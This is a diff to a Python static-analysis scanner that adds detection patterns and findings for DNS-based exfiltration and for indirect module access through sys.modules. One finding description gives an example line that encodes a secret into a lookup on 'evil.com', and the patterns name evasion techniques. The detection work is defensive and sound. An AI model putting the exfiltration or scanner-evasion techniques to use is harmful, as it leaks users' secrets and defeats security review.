@@ -40,6 +40,8 @@ _NETWORK_PATTERNS = [
     r"\baiohttp\s*\.",
     r"\bhttp\.client\b",
     r"\bsocket\.connect\b",
+    r"\bsocket\.getaddrinfo\b",   # DNS exfil: encode data in hostname
+    r"\bsocket\.gethostbyname\b", # DNS exfil variant
     r"\burlopen\s*\(",
     r"\burlretrieve\s*\(",
 ]
@@ -77,13 +79,28 @@ _SENSITIVE_PATHS = [
 
 _CURL_WGET = [r"\bcurl\s", r"\bwget\s"]
 
-# Network calls in ANY Python file (not just setup.py) — lower severity
-# but important for detecting post-install payloads
+# DNS exfiltration patterns — encodes data into DNS lookups
+_DNS_EXFIL_PATTERNS = [
+    r"socket\.getaddrinfo\s*\(",
+    r"socket\.gethostbyname\s*\(",
+    r"dns\.resolver\.",          # dnspython
+    r"resolve\s*\(.*\..*\.",     # generic DNS resolve with dynamic hostname
+]
+
+# sys.modules indirect access (bypasses import name detection)
+_SYS_MODULES_PATTERNS = [
+    r"sys\.modules\s*\[",
+    r"sys\.modules\.get\s*\(",
+]
+
+# Network calls in ANY Python file (not just setup.py)
 _NETWORK_ANY_FILE = [
     r"\burlopen\s*\(",
     r"\brequests\.get\s*\(",
     r"\brequests\.post\s*\(",
     r"\bhttpx\.get\s*\(",
+    r"\bsocket\.getaddrinfo\s*\(",    # DNS exfil
+    r"\bsocket\.gethostbyname\s*\(",  # DNS exfil
 ]
 
 
@@ -566,6 +583,39 @@ class StaticAnalyzer:
                             "beacon, or legitimate update check — review carefully."
                         ),
                         evidence=f"File: {py_file}\nPatterns: {net[:3]}",
+                        source="static",
+                    ))
+
+                # DNS exfiltration in __init__ — especially suspicious
+                dns = _matches_any(code, _DNS_EXFIL_PATTERNS)
+                if dns:
+                    findings.append(Finding(
+                        rule_id="DNS_EXFIL",
+                        severity=Severity.HIGH,
+                        title="Potential DNS exfiltration — encodes data in DNS hostname lookup",
+                        description=(
+                            "DNS-based exfiltration encodes stolen data (env vars, secrets) "
+                            "as subdomains of an attacker-controlled domain. "
+                            "It bypasses many firewalls because DNS traffic is rarely blocked. "
+                            "Example: socket.getaddrinfo(base64(secret)+'.evil.com', 80)"
+                        ),
+                        evidence=f"File: {py_file}\nPatterns: {dns[:3]}",
+                        source="static",
+                    ))
+
+                # sys.modules indirect access — bypasses import name detection
+                sysmod = _matches_any(code, _SYS_MODULES_PATTERNS)
+                if sysmod:
+                    findings.append(Finding(
+                        rule_id="SYS_MODULES_ACCESS",
+                        severity=Severity.MEDIUM,
+                        title="Indirect module access via sys.modules (bypasses static analysis)",
+                        description=(
+                            "Accessing modules via sys.modules[] is a technique to bypass "
+                            "import-based detection. Attackers use it to call network/exec "
+                            "functions without triggering 'import requests' style detection."
+                        ),
+                        evidence=f"File: {py_file}\nPatterns: {sysmod[:3]}",
                         source="static",
                     ))
 
